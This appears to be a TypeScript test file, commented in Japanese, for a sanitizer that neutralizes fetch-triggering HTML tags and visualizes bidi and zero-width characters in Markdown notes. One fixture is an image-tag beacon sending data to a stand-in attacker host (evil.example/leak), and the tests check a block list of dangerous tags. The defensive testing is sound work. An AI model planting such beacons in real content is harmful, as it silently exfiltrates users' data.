import { describe, expect, it } from "vitest";
import {
  NOTE_NEUTRALIZED_TAGS,
  noteLanguageRendersHtml,
  sanitizeNoteText,
} from "./sanitize-note.js";

const LIMIT = 40_000;

/**
 * メモの無害化（不変条件7 の3経路目）。
 *
 * 増分2C の初版はここだけ素通しだった。VS Code の Markdown プレビューは
 * **生の HTML を描画し、既定で https の画像を読み込む** ―― つまり
 * 我々が組んだ3枚構成も CSP も通らずに要求が出る経路が残っていた。
 */

describe("markdown では取得を起こすタグを無力化する", () => {
  it("img は描画されない", () => {
    const out = sanitizeNoteText(
      '説明\n\n<img src="https://evil.example/leak?d=1">',
      "markdown",
      LIMIT,
    );
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("<img");
    // URL そのものは文字として残る（読む人に見える）。**描画されないことが要点。**
    expect(out).toContain("evil.example");
  });

  it("一覧のタグがすべて無力化される", () => {
    for (const tag of NOTE_NEUTRALIZED_TAGS) {
      const out = sanitizeNoteText(`<${tag} x>`, "markdown", LIMIT);
      expect(out, tag).toBe(`&lt;${tag} x>`);
      const closing = sanitizeNoteText(`</${tag}>`, "markdown", LIMIT);
      expect(closing, `/${tag}`).toBe(`&lt;/${tag}>`);
    }
  });

  it("大文字小文字を問わない", () => {
    expect(sanitizeNoteText("<IMG src=x>", "markdown", LIMIT)).toContain("&lt;IMG");
    expect(sanitizeNoteText("<ScRiPt>", "markdown", LIMIT)).toContain("&lt;ScRiPt");
  });

  it("一覧は空でも極端に短くもない（検出器が骨抜きになっていない）", () => {
    expect(NOTE_NEUTRALIZED_TAGS.length).toBeGreaterThan(20);
    for (const required of ["img", "iframe", "link", "script", "svg", "object", "embed"]) {
      expect(NOTE_NEUTRALIZED_TAGS, required).toContain(required);
    }
  });
});

describe("コードの説明を壊さない（この道具の主用途）", () => {
  it("総称型はそのまま", () => {
    const source = "const a: Array<string> = [];\nif (a < b) {}\n";
    expect(sanitizeNoteText(source, "markdown", LIMIT)).toBe(source);
  });

  it("一覧に無いタグはそのまま", () => {
    const source = "<div><span>x</span></div> と <T> と <>";
    expect(sanitizeNoteText(source, "markdown", LIMIT)).toBe(source);
  });

  it("改行と日本語はそのまま通る", () => {
    const source = "# 見出し\n\n- 箇条書き\n- ふたつめ\n\n本文です。\n";
    expect(sanitizeNoteText(source, "markdown", LIMIT)).toBe(source);
  });
});

describe("markdown 以外は無力化しない（HTML を描くプレビューが無い）", () => {
  it("typescript は逐語で通る", () => {
    const source = 'const html = "<img src=x>";\n';
    expect(sanitizeNoteText(source, "typescript", LIMIT)).toBe(source);
  });

  it("plaintext も逐語", () => {
    expect(sanitizeNoteText("<img src=x>", "plaintext", LIMIT)).toBe("<img src=x>");
  });

  it("判定は markdown だけ", () => {
    expect(noteLanguageRendersHtml("markdown")).toBe(true);
    expect(noteLanguageRendersHtml("MARKDOWN")).toBe(true);
    expect(noteLanguageRendersHtml("typescript")).toBe(false);
    expect(noteLanguageRendersHtml("html")).toBe(false);
  });
});

describe("文字レベルの無害化は言語によらず行う（不変条件7）", () => {
  it("双方向オーバーライドは可視化される", () => {
    for (const language of ["markdown", "typescript", "plaintext"]) {
      const out = sanitizeNoteText("abc\u202Edef", language, LIMIT);
      expect(out, language).not.toContain("\u202E");
      expect(out, language).toContain("u202e");
    }
  });

  it("ゼロ幅文字も可視化される", () => {
    expect(sanitizeNoteText("a\u200Bb", "markdown", LIMIT)).toContain("u200b");
  });

  it("改行は潰さない（メモは複数行の文書である）", () => {
    expect(sanitizeNoteText("1行目\n2行目\n3行目", "markdown", LIMIT)).toBe("1行目\n2行目\n3行目");
  });
});
